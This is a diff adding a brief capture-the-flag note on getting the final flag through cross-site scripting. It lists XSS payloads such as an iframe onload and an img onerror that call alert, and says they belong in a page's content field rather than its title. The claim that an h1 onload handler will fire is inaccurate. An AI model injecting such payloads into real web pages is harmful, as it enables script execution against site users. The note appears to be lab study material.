@@ -1,0 +1,10 @@
+To get the final flag we can use the 
+<iframe onload="alert('1')"></iframe>
+or
+<img src="x" onerror="alert('1')">
+
+This works because we can execute javascript in html tags directly
+
+So if we use <h1 onload="alert('1')"></h1> it will still yield results
+
+Also this should be placed as the content of the page we want to create or edit not as the title's input
